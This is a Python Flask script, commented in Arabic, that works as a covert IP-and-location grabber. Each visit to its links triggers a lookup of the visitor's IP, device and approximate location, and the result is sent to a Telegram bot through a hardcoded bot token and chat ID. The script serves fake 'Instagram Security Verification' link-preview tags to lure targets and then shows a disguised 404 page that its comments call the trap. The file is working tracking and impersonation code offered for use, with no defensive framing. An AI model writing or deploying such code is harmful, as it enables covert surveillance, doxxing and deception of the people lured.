from flask import Flask, request
import requests

app = Flask(__name__)

# --- بياناتك الخاصة ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
def track():
    # 1. جلب عنوان IP المتصل
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # 2. جلب بيانات الموقع الجغرافي
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
        lat = geo_res.get('lat', 0)
        lon = geo_res.get('lon', 0)
        
        # إنشاء رابط خريطة جوجل بناءً على الإحداثيات
        google_maps = f"https://www.google.com/maps?q={lat},{lon}"
    except:
        city = country = isp = "Error Fetching Data"
        google_maps = "#"

    # 3. صياغة تقرير تليجرام المطور
    report = (
        f"🎯 <b>تنبيه صيد جديد!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع المسجل:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"🗺️ <b>خريطة الموقع:</b> <a href='{google_maps}'>اضغط هنا للمعاينة</a>\n"
        f"📱 <b>بيانات الجهاز:</b>\n<code>{user_agent}</code>\n"
        f"--------------------------"
    )
    send_to_telegram(report)
    
    # 4. واجهة المعاينة التلقائية (الفخ)
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Instagram Security Verification">
        <meta property="og:description" content="Help us secure your account. Verify your login device now.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="website">
        <title>404 Not Found</title>
    </head>
    <body style="font-family: Arial; text-align: center; padding-top: 50px;">
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on this server.</p>
    </body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
